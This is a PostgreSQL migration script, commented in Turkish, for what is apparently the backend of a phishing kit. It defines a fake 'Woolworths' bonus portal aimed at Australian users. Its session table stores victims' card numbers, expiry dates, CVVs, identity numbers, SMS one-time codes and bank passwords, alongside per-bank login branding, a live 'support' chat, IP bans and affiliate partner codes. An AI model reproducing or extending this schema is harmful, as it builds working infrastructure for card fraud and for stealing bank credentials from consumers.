-- ============================================================
-- 20260810000007 - BÜTÜN TABLOLAR İÇİN KOLON BİRLEŞTİRME MIGRATION
-- (All tables unified schema: sessions/global_settings/banks/chat_messages/
--  audit_event_logs/ip_bans/chat_images/partners/banned_ips)
-- HEMEN SON: NOTIFY pgrst 'reload schema'
-- ============================================================

-- ####################################################################
-- (1) PARTNERS
-- ####################################################################
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS is_active BOOLEAN DEFAULT true;
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS description TEXT;
ALTER TABLE public.partners ADD COLUMN IF NOT EXISTS partner_code TEXT;

-- ####################################################################
-- (2) SESSIONS — BÜTÜN AYRİK MIGRATION KOLOMLARI TEK GARANTİ
-- ####################################################################
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS target_country TEXT DEFAULT 'Australia';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS current_step TEXT DEFAULT 'win';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS amount INT NOT NULL DEFAULT 0;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS status TEXT NOT NULL DEFAULT 'offline';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS visitor_ip TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS ip_address TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS user_agent TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS language TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS current_bank_slug TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS form_data JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS bankFormHistory JSONB DEFAULT '[]'::jsonb;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField1 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField1Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField2Type TEXT DEFAULT 'password';
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField3 TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS orderedField3Key TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS identity_number TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_number TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_expiry TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_cvv TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS card_holder TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS code_value TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_digits INT NOT NULL DEFAULT 6;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS sms_custom_text TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_name TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS participation_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_code TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS is_hidden BOOLEAN DEFAULT false;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS is_completed BOOLEAN DEFAULT false;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS total_bonus_amount_cents INT DEFAULT 0;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS last_ping_at TIMESTAMPTZ;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS invalid_bank_reason TEXT;

-- session_id public_id + partner_id garantisi
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS public_id TEXT;
ALTER TABLE public.sessions ADD COLUMN IF NOT EXISTS partner_id UUID REFERENCES public.partners(id) ON DELETE SET NULL;

-- amount CHECK + sms_digits CHECK (NOT VALID — mevcut satırlar patlamaz)
DO $$ BEGIN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_amount_check CHECK (amount >= 0) NOT VALID;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.sessions ADD CONSTRAINT sessions_sms_digits_check CHECK (sms_digits >= 4 AND sms_digits <= 12) NOT VALID;
EXCEPTION WHEN duplicate_object THEN NULL; END $$;

-- backfills
UPDATE public.sessions SET visitor_ip = COALESCE(visitor_ip, ip_address);
UPDATE public.sessions SET ip_address = COALESCE(ip_address, visitor_ip);
UPDATE public.sessions SET amount = COALESCE(amount, 0) WHERE amount IS NULL;
UPDATE public.sessions SET sms_digits = COALESCE(
  CASE WHEN sms_digits < 4 THEN 6 WHEN sms_digits > 12 THEN 6 ELSE sms_digits END,
  6
);
UPDATE public.sessions SET status = COALESCE(NULLIF(status, ''), 'offline');
UPDATE public.sessions SET current_step = COALESCE(NULLIF(current_step, ''), 'win');

-- SESSIONS INDEX garantileri
CREATE INDEX IF NOT EXISTS idx_sessions_created_at_desc ON public.sessions (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_sessions_current_step ON public.sessions (current_step);
CREATE INDEX IF NOT EXISTS idx_sessions_target_country ON public.sessions (target_country);
CREATE INDEX IF NOT EXISTS idx_sessions_is_hidden ON public.sessions (is_hidden);
CREATE INDEX IF NOT EXISTS idx_sessions_last_ping_at ON public.sessions (last_ping_at);
CREATE UNIQUE INDEX IF NOT EXISTS sessions_public_id_idx ON public.sessions (public_id);
CREATE INDEX IF NOT EXISTS idx_sessions_current_bank_slug ON public.sessions (current_bank_slug);
CREATE INDEX IF NOT EXISTS idx_sessions_status ON public.sessions (status);

-- ####################################################################
-- (3) GLOBAL_SETTINGS — TÜM AYRİK MIGRATION KOLOMLARI TEK GARANTİ
-- ####################################################################
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS target_country TEXT DEFAULT 'Australia';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS currency TEXT DEFAULT 'AUD$';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS portal_name TEXT DEFAULT 'Woolworths Customer Portal';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS support_center_name TEXT DEFAULT 'Woolworths Customer Support';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_title TEXT DEFAULT 'Exclusive Woolworths Bonus Offer';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_subtitle TEXT DEFAULT 'Congratulations! You have been selected.';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_title TEXT DEFAULT 'Woolworths Live Support';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS logo_url TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url TEXT DEFAULT '/portal/desktop-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS bg_url_mobile TEXT DEFAULT '/portal/mobile-background.png';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS wheel_settings JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS translations JSONB DEFAULT '{}'::jsonb;

-- add_settings_columns (katılım kodu + profile metinleri)
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_title TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS code_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS live_support_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_title_small TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_title_main TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS win_button TEXT DEFAULT 'Claim bonus';

-- add_more_translation_settings (sms + kart + profile label'ları)
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS banken_search_placeholder TEXT DEFAULT 'Search...';
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_subtitle TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_input_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS sms_loading TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_owner_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_number_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_expiry_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_cvv_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS card_button TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_firstname_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_lastname_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_phone_label TEXT;
ALTER TABLE public.global_settings ADD COLUMN IF NOT EXISTS profile_loading_text TEXT;

-- ####################################################################
-- (4) BANKS — BİRLEŞİK KOLONLAR
-- ####################################################################
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS slug TEXT NOT NULL DEFAULT '';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS name TEXT NOT NULL DEFAULT '';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS country TEXT NOT NULL DEFAULT 'Australia';
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS logo_url TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS brand_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS accent_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS sort_order INT DEFAULT 100;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS is_active BOOLEAN DEFAULT true;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS primary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS secondary_color TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS description TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS login_url TEXT;
ALTER TABLE public.banks ADD COLUMN IF NOT EXISTS help_text TEXT;

-- ####################################################################
-- (5) CHAT_MESSAGES — BİRLEŞİK KOLONLAR (sender + role, image_url + image_urls)
-- ####################################################################
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS session_id UUID REFERENCES public.sessions(id) ON DELETE CASCADE;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS sender TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS role TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS content TEXT NOT NULL DEFAULT '';
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS image_url TEXT;
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS image_urls TEXT[] DEFAULT '{}'::text[];
ALTER TABLE public.chat_messages ADD COLUMN IF NOT EXISTS session_uuid UUID;

-- backfill
UPDATE public.chat_messages SET sender = COALESCE(NULLIF(sender, ''), role) WHERE sender IS NULL OR sender = '';
UPDATE public.chat_messages SET role = COALESCE(NULLIF(role, ''), sender) WHERE role IS NULL OR role = '';
UPDATE public.chat_messages SET image_url = COALESCE(NULLIF(image_url, ''), image_urls[1]) WHERE image_url IS NULL OR image_url = '';
UPDATE public.chat_messages SET image_urls = COALESCE(
  CASE WHEN cardinality(image_urls) = 0 AND image_url IS NOT NULL AND image_url <> '' THEN ARRAY[image_url]::text[]
       WHEN image_urls IS NULL THEN '{}'::text[] ELSE image_urls END,
  '{}'::text[]
);

CREATE INDEX IF NOT EXISTS idx_chat_messages_session_id ON public.chat_messages(session_id);
CREATE INDEX IF NOT EXISTS idx_chat_messages_created_at ON public.chat_messages(created_at);

-- ####################################################################
-- (6) CHAT_IMAGES
-- ####################################################################
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS message_id UUID REFERENCES public.chat_messages(id) ON DELETE CASCADE;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS storage_path TEXT NOT NULL DEFAULT '';
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS public_url TEXT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS mime_type TEXT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS size_bytes INT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS width INT;
ALTER TABLE public.chat_images ADD COLUMN IF NOT EXISTS height INT;
CREATE INDEX IF NOT EXISTS idx_chat_images_message_id ON public.chat_images(message_id);

-- ####################################################################
-- (7) IP_BANS + BANNED_IPS (2 adet benzer tablo — ikisini de garanti et)
-- ####################################################################
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS ip_address TEXT NOT NULL DEFAULT '';
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS reason TEXT;
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS banned_by TEXT;
ALTER TABLE public.ip_bans ADD COLUMN IF NOT EXISTS expires_at TIMESTAMPTZ;
CREATE UNIQUE INDEX IF NOT EXISTS idx_ip_bans_ip_address ON public.ip_bans(ip_address);

CREATE TABLE IF NOT EXISTS public.banned_ips (
  id UUID PRIMARY KEY DEFAULT gen_random_uuid(),
  ip_address TEXT NOT NULL UNIQUE,
  reason TEXT,
  banned_by TEXT,
  expires_at TIMESTAMPTZ,
  created_at TIMESTAMPTZ NOT NULL DEFAULT NOW()
);
ALTER TABLE public.banned_ips ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS banned_ips_all_policy ON public.banned_ips;
CREATE POLICY banned_ips_all_policy ON public.banned_ips FOR ALL USING (true) WITH CHECK (true);

-- ####################################################################
-- (8) AUDIT_EVENT_LOGS — BİRLEŞİK KOLONLAR (ŞEMA A+B 38 KOLON TOPLAM)
-- ####################################################################
DO $$ BEGIN
  CREATE TABLE IF NOT EXISTS public.audit_event_logs (
    id BIGINT GENERATED ALWAYS AS IDENTITY PRIMARY KEY,
    created_at TIMESTAMPTZ NOT NULL DEFAULT now()
  );
EXCEPTION WHEN duplicate_table THEN NULL; END $$;

-- ŞEMA B (production bootstrap) + ekstra
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_type TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS severity TEXT NOT NULL DEFAULT 'info';
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS session_id TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS session_uuid UUID;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS bank_slug TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS actor TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS message TEXT NOT NULL DEFAULT '';
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS payload JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS metadata JSONB DEFAULT '{}'::jsonb;

-- ŞEMA A (20260808_create_audit_event_logs 38 kolon geri kalanı)
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS public_id TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS partner_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_kind TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS event_action TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS status TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS user_ip TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS user_agent TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS country TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS city TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS referer_url TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS current_url TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS from_step TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS to_step TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS pathname TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS bank_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS login_method TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS admin_email TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS admin_action TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS meta JSONB DEFAULT '{}'::jsonb;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS error_name TEXT;
ALTER TABLE public.audit_event_logs ADD COLUMN IF NOT EXISTS error_message TEXT;

-- session_id TEXT garanti (UUID ise TEXT'e çevir)
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN session_id TYPE text USING session_id::text;
EXCEPTION WHEN others THEN NULL; END $$;

-- BACKFILL ÇİFT YÖNLÜ (10 ADIM)
UPDATE public.audit_event_logs SET event_type = COALESCE(NULLIF(event_type, ''), event_kind) WHERE event_type IS NULL OR event_type = '';
UPDATE public.audit_event_logs SET event_kind = COALESCE(NULLIF(event_kind, ''), event_type) WHERE event_kind IS NULL OR event_kind = '';
UPDATE public.audit_event_logs SET severity = COALESCE(NULLIF(severity, ''), status, 'info');
UPDATE public.audit_event_logs SET status = COALESCE(NULLIF(status, ''), severity, 'info');
UPDATE public.audit_event_logs SET message = COALESCE(NULLIF(message, ''), CONCAT(event_kind, ' ', event_action), 'audit event');
UPDATE public.audit_event_logs SET actor = COALESCE(NULLIF(actor, ''), admin_email, bank_slug) WHERE actor IS NULL OR actor = '';
UPDATE public.audit_event_logs SET admin_email = COALESCE(NULLIF(admin_email, ''), CASE WHEN position('@' in actor) > 0 THEN actor END);
UPDATE public.audit_event_logs SET metadata = COALESCE(metadata, '{}'::jsonb) || COALESCE(meta, '{}'::jsonb) || jsonb_build_object(
    'from_step', from_step, 'to_step', to_step, 'pathname', pathname,
    'user_ip', user_ip, 'user_agent', user_agent, 'country', country,
    'city', city, 'referer_url', referer_url, 'current_url', current_url,
    'bank_name', bank_name, 'login_method', login_method,
    'admin_email', admin_email, 'admin_action', admin_action,
    'error_name', error_name, 'error_message', error_message,
    'public_id', public_id, 'partner_name', partner_name,
    'event_action', event_action, 'event_kind', event_kind
);
UPDATE public.audit_event_logs SET meta = COALESCE(meta, '{}'::jsonb) || COALESCE(metadata, '{}'::jsonb);
UPDATE public.audit_event_logs SET event_action = COALESCE(NULLIF(event_action, ''), from_step, to_step, event_kind);

-- NOT NULL garantileri
UPDATE public.audit_event_logs SET event_type = 'audit:event' WHERE event_type IS NULL OR event_type = '';
UPDATE public.audit_event_logs SET severity = 'info' WHERE severity IS NULL OR severity = '';
UPDATE public.audit_event_logs SET message = 'audit event' WHERE message IS NULL OR message = '';
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN event_type SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN severity SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;
DO $$ BEGIN
    ALTER TABLE public.audit_event_logs ALTER COLUMN message SET NOT NULL;
EXCEPTION WHEN others THEN NULL; END $$;

-- INDEX garantileri (BOTH ŞEMA)
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_created_at_desc ON public.audit_event_logs (created_at DESC);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_session ON public.audit_event_logs (session_id, session_uuid);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_type ON public.audit_event_logs (event_type);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_kind_action ON public.audit_event_logs (event_kind, event_action);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_severity ON public.audit_event_logs (severity);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_bank_slug ON public.audit_event_logs (bank_slug);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_partner_name ON public.audit_event_logs (partner_name);
CREATE INDEX IF NOT EXISTS idx_audit_event_logs_public_id ON public.audit_event_logs (public_id);

-- RLS + policy garantileri
ALTER TABLE public.audit_event_logs ENABLE ROW LEVEL SECURITY;
DROP POLICY IF EXISTS audit_event_select_public ON public.audit_event_logs;
CREATE POLICY audit_event_select_public ON public.audit_event_logs FOR SELECT USING (true);
DROP POLICY IF EXISTS audit_event_insert_anon ON public.audit_event_logs;
CREATE POLICY audit_event_insert_anon ON public.audit_event_logs FOR INSERT WITH CHECK (true);
DROP POLICY IF EXISTS audit_event_authenticated_all ON public.audit_event_logs;
CREATE POLICY audit_event_authenticated_all ON public.audit_event_logs FOR ALL
  USING (auth.role() = 'authenticated' OR auth.role() = 'service_role' OR current_user = 'postgres')
  WITH CHECK (auth.role() = 'authenticated' OR auth.role() = 'service_role' OR current_user = 'postgres');

GRANT SELECT, INSERT, UPDATE, DELETE ON public.audit_event_logs TO anon, authenticated, service_role;

-- ####################################################################
-- (9) TRIGGER set_updated_at — KALICI GARANTİ
-- ####################################################################
CREATE OR REPLACE FUNCTION public.set_updated_at()
RETURNS trigger AS $$
begin
  new.updated_at = now();
  return new;
end;
$$ language plpgsql security definer set search_path = public;

DROP TRIGGER IF EXISTS sessions_set_updated_at ON public.sessions;
CREATE TRIGGER sessions_set_updated_at
BEFORE UPDATE ON public.sessions
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS partners_set_updated_at ON public.partners;
CREATE TRIGGER partners_set_updated_at
BEFORE UPDATE ON public.partners
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS banks_set_updated_at ON public.banks;
CREATE TRIGGER banks_set_updated_at
BEFORE UPDATE ON public.banks
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

DROP TRIGGER IF EXISTS global_settings_set_updated_at ON public.global_settings;
CREATE TRIGGER global_settings_set_updated_at
BEFORE UPDATE ON public.global_settings
FOR EACH ROW EXECUTE FUNCTION public.set_updated_at();

-- ####################################################################
-- (10) POSTGREST SCHEMA CACHE RELOAD — KOLON YOK HATASINI KALICI DÜZELT
-- ####################################################################
NOTIFY pgrst, 'reload schema';
